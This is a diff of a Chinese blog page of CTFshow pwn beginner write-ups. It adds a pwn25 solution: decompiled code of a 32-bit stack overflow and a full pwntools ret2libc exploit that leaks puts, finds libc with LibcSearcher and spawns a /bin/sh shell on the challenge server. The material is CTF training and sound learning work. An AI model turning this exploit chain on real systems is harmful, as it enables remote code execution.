@@ -225,7 +225,7 @@
         <i class="fa fa-keyboard-o"></i>
         <span class="post-meta-item-text">  字数统计: </span>
         <!-- 安装插件npm install hexo-wordcount --save -->
-        <span class="post-count">5.5k字</span>
+        <span class="post-count">6.3k字</span>
       </span>
     </span>
 
@@ -234,7 +234,7 @@
       <span class="post-meta-item-icon">
         <i class="fa fa-hourglass-half"></i>
         <span class="post-meta-item-text">  阅读时长: </span>
-        <span class="post-count">23分</span>
+        <span class="post-count">27分</span>
       </span>
     </span>
 </div>
@@ -789,7 +789,7 @@ checksec ./pwn<span aria-hidden="true" class="line-numbers-rows"><span></span><s
 <h3 id="pwn23"><a href="#pwn23" class="headerlink" title="pwn23"></a>pwn23</h3><blockquote>
 <p>缓冲区溢出</p>
 </blockquote>
-<p>下载题目附件pwn，丢进虚拟机</p>
+<p>下载题目附件pwn，丢进虚拟机checksec</p>
 <p><img src="/blog/2023/06/20/ctfshow-pwn%E5%85%A5%E9%97%A8/image-20230624215623900.png" alt="image-20230624215623900"></p>
 <p>是32位的，丢进ida反编译</p>
 <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
@@ -850,7 +850,7 @@ checksec ./pwn<span aria-hidden="true" class="line-numbers-rows"><span></span><s
 <h3 id="pwn24"><a href="#pwn24" class="headerlink" title="pwn24"></a>pwn24</h3><blockquote>
 <p>shellcraft</p>
 </blockquote>
-<p>下载题目附件pwn，丢进虚拟机</p>
+<p>下载题目附件pwn，丢进虚拟机checksec</p>
 <p><img src="/blog/2023/06/20/ctfshow-pwn%E5%85%A5%E9%97%A8/image-20230624222936319.png" alt="image-20230624222936319"></p>
 <p>是32位的，丢进ida反编译</p>
 <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
@@ -938,7 +938,94 @@ p<span class="token punctuation">.</span>interactive<span class="token punctuati
 <p>连上后获取flag</p>
 <p><img src="/blog/2023/06/20/ctfshow-pwn%E5%85%A5%E9%97%A8/image-20230624225136038.png" alt="image-20230624225136038"></p>
 <hr>
-<h3 id="pwn25"><a href="#pwn25" class="headerlink" title="pwn25"></a>pwn25</h3>
+<h3 id="pwn25"><a href="#pwn25" class="headerlink" title="pwn25"></a>pwn25</h3><blockquote>
+<p>ret2libc</p>
+</blockquote>
+<p>下载题目附件pwn，丢进虚拟机checksec</p>
+<p><img src="/blog/2023/06/20/ctfshow-pwn%E5%85%A5%E9%97%A8/image-20230625210740882.png" alt="image-20230625210740882"></p>
+<p>开了NX，是32位，题目描述让我们用ret2libc来做</p>
+<p>丢进ida反编译</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">ctfshow</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>argc<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">logo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">write</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"Hello CTFshow!\n"</span><span class="token punctuation">,</span> <span class="token number">0xEu</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>ctfshow()函数</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token class-name">ssize_t</span> <span class="token function">ctfshow</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+  <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">132</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+0h] [ebp-88h] BYREF</span>
+
+  <span class="token keyword">return</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x100u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>审计代码，先通过ctfshow()函数，读入我们输入的字符串</p>
+<p>注意这里读入的buf是132个长度，而read()函数限制我们读入的长度位0x100，也就是256个长度</p>
+<p>说明会缓冲区溢出</p>
+<p>注意缓冲区buf定义在函数的栈帧中，使用ebp（基址指针）和esp（堆栈指针）来寻址，偏移量为-88，要覆盖返回地址的话偏移量还要-4，即使用<code>0x88+0x4个无用填充字符覆盖到返回地址</code></p>
+<p>我们先看一下plt表中的函数</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">objdump <span class="token parameter variable">-d</span> <span class="token parameter variable">-j</span> .plt pwn<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/blog/2023/06/20/ctfshow-pwn%E5%85%A5%E9%97%A8/image-20230625211327193.png" alt="image-20230625211327193"></p>
+<p>可以看到plt表中含有puts函数跟write函数，那got表中也一定有他俩，</p>
+<p>所以我们就使用puts函数来输出函数的内存地址</p>
+<p>然后寻找相应的libc版本中<code>puts</code>函数的地址，接着找到找到libc中的<code>system</code>函数地址，填充执行system函数之后的返回地址(偏移量固定为4)，最后填入system的参数<code>/bin/sh</code></p>
+<p>exp(python3)：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>
+
+<span class="token comment"># 打印调试信息</span>
+context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
+
+<span class="token comment"># 建立连接</span>
+p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"pwn.challenge.ctf.show"</span><span class="token punctuation">,</span> <span class="token string">"28119"</span><span class="token punctuation">)</span>
+elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./pwn"</span><span class="token punctuation">)</span>
+
+<span class="token comment"># 溢出偏移地址</span>
+offset <span class="token operator">=</span> <span class="token number">0x88</span> <span class="token operator">+</span> <span class="token number">0x4</span>
+<span class="token comment"># main函数地址</span>
+main_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'main'</span><span class="token punctuation">]</span>
+<span class="token comment"># plt表中puts函数地址</span>
+puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
+<span class="token comment"># got表中puts函数的地址</span>
+puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
+
+<span class="token comment"># payload：0x88+0x4个无用填充字符覆盖到返回地址，</span>
+<span class="token comment"># 将puts函数plt表地址做返回地址，代表ctfshow函数执行完会执行puts函数，</span>
+<span class="token comment"># main_addr是puts函数执行完后的返回地址，使用puts函数执行完后回到main函数继续利用溢出漏洞</span>
+<span class="token comment"># puts函数got表中的地址作为puts函数执行的参数，让puts函数输出puts函数在内存的地址</span>
+payload <span class="token operator">=</span> offset <span class="token operator">*</span> <span class="token string">b'a'</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span>
+<span class="token comment"># 发送payload</span>
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+<span class="token comment"># 接收puts函数输出的puts函数在内存的地址</span>
+puts_addr <span class="token operator">=</span> u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>puts_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token comment"># 在根据内存中puts函数的地址寻找相应的libc版本中puts函数的地址</span>
+libc <span class="token operator">=</span> LibcSearcher<span class="token punctuation">(</span><span class="token string">"puts"</span><span class="token punctuation">,</span> puts_addr<span class="token punctuation">)</span>
+<span class="token comment"># 找到libc中的puts函数地址之后，将内存的puts函数地址减去libc中的puts函数地址就得到了libc的基地址</span>
+libc_base <span class="token operator">=</span> puts_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">"puts"</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token comment"># 使用libc.dump("system")找到libc中的system函数地址，再加上基地址就得到system函数在内存的地址</span>
+system_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">"system"</span><span class="token punctuation">)</span>
+<span class="token comment"># 使用libc.dump("str_bin_sh")找到libc中的"/bin/sh"字符串地址，再加上基地址就得到"/bin/sh"字符串在内存的地址</span>
+binsh_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">"str_bin_sh"</span><span class="token punctuation">)</span>
+<span class="token comment"># payload：填充栈空间到返回地址，将返回地址覆盖为system函数的地址</span>
+<span class="token comment"># 然后填充执行system函数之后的返回地址，填充什么都可以，但是长度必须为4</span>
+<span class="token comment"># 最后填入system的参数“/bin/sh”</span>
+payload <span class="token operator">=</span> offset <span class="token operator">*</span> <span class="token string">b'a'</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">4</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>期间遇到LibcSearcher库出问题的可以看这个博客<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_40026795/article/details/107150265">LibcSearcher的安装使用</a></p>
+<p><img src="/blog/2023/06/20/ctfshow-pwn%E5%85%A5%E9%97%A8/image-20230626003947402.png" alt="image-20230626003947402"></p>
+<p><img src="/blog/2023/06/20/ctfshow-pwn%E5%85%A5%E9%97%A8/image-20230626003958396.png" alt="image-20230626003958396"></p>
+<hr>
+
     </div>
     
     
